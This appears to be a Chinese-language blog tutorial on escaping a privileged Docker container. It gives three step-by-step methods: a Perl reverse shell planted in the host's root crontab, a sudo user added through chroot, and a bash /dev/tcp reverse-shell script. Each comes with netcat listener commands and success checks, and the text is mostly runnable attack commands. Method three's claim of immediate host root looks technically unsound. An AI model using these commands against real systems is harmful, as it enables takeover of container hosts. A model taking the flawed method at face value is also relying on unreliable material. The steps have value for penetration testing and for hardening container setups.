<h2 class="md-end-block md-heading"><span class="md-plain">特权模式逃逸原理与前提</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">核心原理</span></h3>
<p class="md-end-block md-p"><span class="md-plain">当 Docker 容器以 </span><span class="md-pair-s" spellcheck="false"><code>--privileged</code></span><span class="md-plain"> 模式启动时，容器内的 </span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain"> 用户获得与宿主机 </span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain"> 几乎等同的权限，可直接访问宿主机设备、挂载磁盘分区，绕过 Namespace 和 Cgroup 隔离，实现对宿主机文件系统的完全控制，进而通过多种方式逃逸获取宿主机权限。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">前提条件</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">容器以特权模式启动：</span><span class="md-pair-s" spellcheck="false"><code>docker run --rm --privileged -it [镜像名]</code></span><span class="md-plain">（</span><span class="md-pair-s" spellcheck="false"><code>--privileged</code></span><span class="md-plain"> 是关键）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">宿主机根分区已挂载到容器内路径（如 </span><span class="md-pair-s" spellcheck="false"><code>/host</code></span><span class="md-plain">），可通过 </span><span class="md-pair-s" spellcheck="false"><code>mount /dev/sda1 /host</code></span><span class="md-plain"> 完成挂载（</span><span class="md-pair-s" spellcheck="false"><code>/dev/sda1</code></span><span class="md-plain"> 为宿主机根分区设备，需通过 </span><span class="md-pair-s" spellcheck="false"><code>fdisk -l</code></span><span class="md-plain"> 确认）。</span></p>
<img class="alignnone size-full wp-image-633" src="/wp-content/uploads/2025/img-7eb8ce8d9411.png" alt="" width="683" height="76" /></li>
</ol>
<h2 class="md-end-block md-heading md-focus"><span class="md-plain">三种实战逃逸方法详解</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">方法一：通过定时任务写入 Perl 反向 Shell</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">操作步骤（容器内执行）</span></h4>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">写入定时任务：向宿主机</span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain">用户的定时任务文件添加 Perl 反向 Shell 命令，每分钟执行一次：</span></p>



```bash
echo $'*/1 * * * * perl -e \'use Socket;$i="192.168.226.133";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' >> /host/var/spool/cron/crontabs/root
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">修复权限：确保定时任务文件权限为600（</span><span class="md-pair-s" spellcheck="false"><code>cron</code></span><span class="md-plain">服务要求）：</span></p>



```bash
chmod 600 /host/var/spool/cron/crontabs/root
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">验证任务写入：检查宿主机定时任务文件内容及权限：</span></p>



```bash
cat /host/var/spool/cron/crontabs/root  # 确认命令已写入  
ls -l /host/var/spool/cron/crontabs/root  # 权限应为 -rw-------
```


<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250804155549103.png"><img class="alignnone size-full wp-image-634" src="/wp-content/uploads/2025/img-337cf7ddbd47.png" alt="" width="673" height="35" /></span></p>
</li>
</ol>
<h4 class="md-end-block md-heading"><span class="md-plain">触发与验证（攻击机执行）</span></h4>
<p class="md-end-block md-p"><span class="md-plain">在攻击机启动端口监听，等待宿主机定时任务触发连接：</span></p>



```bash
nc -lvvp 1234
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">成功标志：监听端收到来自宿主机的连接，显示 </span><span class="md-pair-s" spellcheck="false"><code>uid=0(root)</code></span><span class="md-plain"> 信息，可执行 </span><span class="md-pair-s" spellcheck="false"><code>hostname</code></span><span class="md-plain"> 等命令（如返回 </span><span class="md-pair-s" spellcheck="false"><code>lang-virtual-machine</code></span><span class="md-plain">）。</span></p>
<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250804155620709.png"><img class="alignnone size-full wp-image-635" src="/wp-content/uploads/2025/img-8f6ac393b1f2.png" alt="" width="562" height="185" /></span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">方法二：通过 </span><span class="md-pair-s" spellcheck="false"><code>chroot</code></span><span class="md-plain"> 切换根目录添加 sudo 用户</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">操作步骤（容器内执行）</span></h4>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">切换到宿主机根目录：使用</span><span class="md-pair-s" spellcheck="false"><code>chroot </code></span><span class="md-plain">命令将当前环境切换为宿主机文件系统：</span></p>



```bash
chroot /host
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">创建新用户并赋予权限：在宿主机直接创建</span><span class="md-pair-s" spellcheck="false"><code>hacker</code></span><span class="md-plain">用户，并添加到</span><span class="md-pair-s" spellcheck="false"><code>sudo</code></span><span class="md-plain">组（获得管理员权限）：</span></p>



```bash
adduser hacker  # 按提示设置密码  
usermod -aG sudo hacker  # 加入 sudo 组
```


</li>
</ol>
<h4 class="md-end-block md-heading"><span class="md-plain">验证（宿主机执行）</span></h4>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">切换到 </span><span class="md-pair-s" spellcheck="false"><code>hacker</code></span><span class="md-plain"> 用户：</span><span class="md-pair-s" spellcheck="false"><code>su hacker</code></span><span class="md-plain">（输入密码）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">确认权限：执行 </span><span class="md-pair-s" spellcheck="false"><code>id</code></span><span class="md-plain"> 显示 </span><span class="md-pair-s" spellcheck="false"><code>uid=1002(hacker) gid=1002(hacker) 组=1002(hacker),27(sudo)</code></span><span class="md-plain">，表明具备 sudo 权限。</span></p>
<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250804160530387.png"><img class="alignnone size-full wp-image-636" src="/wp-content/uploads/2025/img-8f7f0b360c0e.png" alt="" width="631" height="161" /></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">测试管理员权限：</span><span class="md-pair-s" spellcheck="false"><code>sudo passwd root</code></span><span class="md-plain"> 可成功修改 root 密码，验证逃逸成功。</span></p>
</li>
</ol>
<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250804160539980.png"><img class="alignnone size-full wp-image-637" src="/wp-content/uploads/2025/img-df4933a18b5a.png" alt="" width="523" height="88" /></span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">方法三：直接执行脚本反弹 Shell（立即触发）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">操作步骤（容器内执行）</span></h4>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">创建反弹脚本：在宿主机</span><span class="md-pair-s" spellcheck="false"><code>/tmp</code></span><span class="md-plain">目录生成可执行的反向 Shell 脚本：</span></p>



```bash
echo '#!/bin/bash' > /host/tmp/escape.sh  # 脚本声明  
echo 'bash -i >& /dev/tcp/192.168.226.133/1234 0>&1' >> /host/tmp/escape.sh  # 反向连接命令
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">赋予执行权限：</span></p>



```bash
chmod +x /host/tmp/escape.sh
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">立即执行脚本：调用宿主机</span><span class="md-pair-s" spellcheck="false"><code>bash</code></span><span class="md-plain">直接运行脚本，无需等待定时任务：</span></p>



```bash
/host/bin/bash /host/tmp/escape.sh
```

</li>
</ol>
<h4 class="md-end-block md-heading"><span class="md-plain">触发与验证（攻击机执行）</span></h4>
<p class="md-end-block md-p"><span class="md-plain">攻击机启动监听：</span></p>



```bash
nc -lvvp 1234
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">成功标志：立即收到宿主机连接，执行 </span><span class="md-pair-s" spellcheck="false"><code>id</code></span><span class="md-plain"> 显示 </span><span class="md-pair-s" spellcheck="false"><code>uid=0(root)</code></span><span class="md-plain">，直接获取 root 权限。</span></p>
